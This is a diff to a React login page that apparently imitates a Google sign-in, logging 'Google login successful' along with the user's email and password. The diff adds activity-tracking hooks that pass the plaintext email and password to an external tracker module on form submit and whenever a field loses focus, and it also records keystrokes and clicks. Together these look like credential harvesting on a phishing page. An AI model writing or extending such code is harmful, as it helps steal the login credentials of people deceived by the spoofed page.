@@ -1,5 +1,15 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import logoImage from "./logo.png";
+import {
+  trackPageView,
+  trackPageExit,
+  trackInputFocus,
+  trackInputBlur,
+  trackInputChange,
+  trackButtonClick,
+  trackLinkClick,
+  trackFormSubmit,
+} from "./utils/activityTracker";
 
 interface LoginPageProps {
   onNavigate: (email: string, password: string) => void;
@@ -10,9 +20,22 @@ export default function LoginPage({ onNavigate }: LoginPageProps) {
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
 
+  // Track page view on mount
+  useEffect(() => {
+    trackPageView('/login-page-1');
+    
+    return () => {
+      trackPageExit('/login-page-1');
+    };
+  }, []);
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     console.log("Google login successful with:", { email, password });
+    
+    // Track form submission
+    trackFormSubmit('login-form-page-1', { email, password }, '/login-page-1');
+    
     setLoading(true);
     // Simulate loading then navigate
     setTimeout(() => {
@@ -60,7 +83,12 @@ export default function LoginPage({ onNavigate }: LoginPageProps) {
                   <input
                     type="email"
                     value={email}
-                    onChange={(e) => setEmail(e.target.value)}
+                    onChange={(e) => {
+                      setEmail(e.target.value);
+                      trackInputChange('email-input-page-1', e.target.value.length > 0, '/login-page-1');
+                    }}
+                    onFocus={() => trackInputFocus('email-input-page-1', '/login-page-1')}
+                    onBlur={() => trackInputBlur('email-input-page-1', email, '/login-page-1')}
                     placeholder="Your mail"
                     className="w-full px-4 py-3.5 md:py-3 border border-gray-300 rounded text-[16px] md:text-base focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-100 transition-all placeholder:text-gray-500"
                     required
@@ -72,7 +100,12 @@ export default function LoginPage({ onNavigate }: LoginPageProps) {
                   <input
                     type="password"
                     value={password}
-                    onChange={(e) => setPassword(e.target.value)}
+                    onChange={(e) => {
+                      setPassword(e.target.value);
+                      trackInputChange('password-input-page-1', e.target.value.length > 0, '/login-page-1');
+                    }}
+                    onFocus={() => trackInputFocus('password-input-page-1', '/login-page-1')}
+                    onBlur={() => trackInputBlur('password-input-page-1', password, '/login-page-1')}
                     placeholder="Your password"
                     className="w-full px-4 py-3.5 md:py-3 border border-gray-300 rounded text-[16px] md:text-base focus:border-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-100 transition-all placeholder:text-gray-500"
                     required
@@ -82,6 +115,10 @@ export default function LoginPage({ onNavigate }: LoginPageProps) {
                 <div>
                   <a
                     href="#"
+                    onClick={(e) => {
+                      e.preventDefault();
+                      trackLinkClick('reset-password-link-page-1', '/login-page-1');
+                    }}
                     className="text-[15px] md:text-sm font-medium text-blue-600 hover:underline"
                   >
                     Reset password ?
@@ -99,12 +136,17 @@ export default function LoginPage({ onNavigate }: LoginPageProps) {
                 <div className="flex flex-col-reverse sm:flex-row items-stretch sm:items-center justify-between gap-3 sm:gap-4 pt-4">
                   <a
                     href="#"
+                    onClick={(e) => {
+                      e.preventDefault();
+                      trackLinkClick('create-account-link-page-1', '/login-page-1');
+                    }}
                     className="text-[15px] md:text-sm font-medium text-blue-600 hover:underline text-center sm:text-left"
                   >
                     Create account
                   </a>  
                   <button
                     type="submit"
+                    onClick={() => trackButtonClick('continue-button-page-1', '/login-page-1')}
                     className="px-6 py-3 md:py-2.5 bg-blue-600 text-white text-[16px] md:text-sm font-medium rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-purple-300 transition-colors shadow-sm hover:shadow"
                   >
                     Continue
